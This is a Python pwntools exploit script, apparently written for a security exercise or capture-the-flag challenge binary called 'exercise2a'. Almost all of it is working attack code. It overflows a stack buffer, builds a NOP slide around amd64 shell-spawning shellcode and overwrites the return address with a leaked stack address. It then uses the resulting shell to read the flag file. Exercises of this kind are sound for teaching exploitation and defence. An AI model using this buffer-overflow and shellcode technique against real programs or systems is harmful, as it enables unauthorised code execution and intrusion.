#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise2a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        # "strace", "-o", "strace.out", 
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *check_authorization+96
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

LEN_TO_RET_ADDR = 136

# Whitespaces - 09, 0a, 0b, 0c, 0d, 20, but others like 08 seem to also break the exploit,
# so also ingore all < 0e
WHITESPACES = [i.to_bytes(1, 'big') for i in range(1, 0x0e)] + [b'\x20']
print(WHITESPACES)
while True:
    r = start()

    v1_addr_raw = r.recvline().decode().rstrip()
    v1_addr = int(v1_addr_raw, 16)
    # Skip Some bytes, as a previous instruction might mess up the nop-slide
    v1_addr_bytes = pack(v1_addr + 8, 64)

    print(b'WHYTF ' + v1_addr_bytes)
    if any([ws in v1_addr_bytes for ws in WHITESPACES]):
        r.kill()
        continue
    

    NOP_SLIDE_PROLOGUE_LEN = 16
    read_flag = shellcraft.amd64.linux.sh()
    read_flag = asm(read_flag)

    nop_slide_prologue = asm(shellcraft.amd64.nop()) * NOP_SLIDE_PROLOGUE_LEN
    nop_slide_epilogue = asm(shellcraft.amd64.nop()) * (LEN_TO_RET_ADDR - len(read_flag) - NOP_SLIDE_PROLOGUE_LEN)
    

    sc = nop_slide_prologue + read_flag + nop_slide_epilogue
    
    sc += v1_addr_bytes

    r.sendline(sc)

    pause(3)
    r.sendline(b"cat flag && echo 'GOT_THE_FLAG'")

    a = r.recvuntil(b'GOT_THE_FLAG')
    print(a)
    break
